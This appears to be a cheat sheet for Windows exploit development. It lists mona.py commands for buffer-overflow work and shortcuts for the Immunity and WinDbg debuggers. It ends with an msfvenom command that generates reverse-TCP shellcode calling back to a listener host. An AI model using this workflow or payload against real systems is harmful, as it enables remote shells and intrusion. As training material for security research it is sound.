---
title: Windows Exploit Dev
category: Exploit Development
order: 1
---

> **Mona** 

Run a Program | <code> nbd --run /path/to/program </code>
Set Working Folder | <code> !mona config -set workingfolder c:\logs\%p </code>
Set Modules to Exclude | <code> !mona config -set excluded_modules "module1.dll,module2.dll" </code>
Generate cyclic pattern | <code> !mona pc [size] </code>
Find offset | <code> po [address] </code>
find register overwritten with pattern |  <code>  findmsp </code> 
Generate bytes from 0x00 to 0xff excluding badchars | <code>  bytearray -b [badchars] </code> 
find a jump point | <code> jmp -r [register] </code> 
skip modules that start with 0x00 |-n </code> 
skip os modules | <code> -o </code>  
Module <code> -m </code>
Module property | <code> -cm </code>
filter bad chars | <code> -cpd  </code>

> ***Additional Resources***

* [Mona Manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

> **Debuggers: Immunity** 

Go to a memory address|  Right Click → Go to → Expression (Ctrl+G)
Breakpoint | F2
Step | F7
Exec till Return | Ctrl+F9
Run | F9
Pause | F12

> ***Additional Resources***

* [Immunity](https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982)


> **Debuggers: WINDBG** 

Open Executable | CTRL+E
Attach to process | F6
Memory | Alt+5
Close Window | Ctrl+F4
Restart | Ctrl+Shift+F5
Break | Ctrl+Break
d esp | dump register
g | pass exception
gN | step
bp [address] | breakpoint
bl | list breakpoints
!exchain | view exception chain
.load pykd.pyd | load python
exceute mona stuff | <code> !py mona [command] [args] </code>
Find instruction from opcode | <code> a [enter] jmp esp [enter] [enter] </code>
Find instruction from opcode | <code> u [address from above] </code>
Inspect | u [address]  
View stack | u
Step | t

> **Shellcode** 

{% highlight bash %}
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.37.1 LPORT=4321  -b '\x00\x09\x0a' -f python
{% endhighlight %}




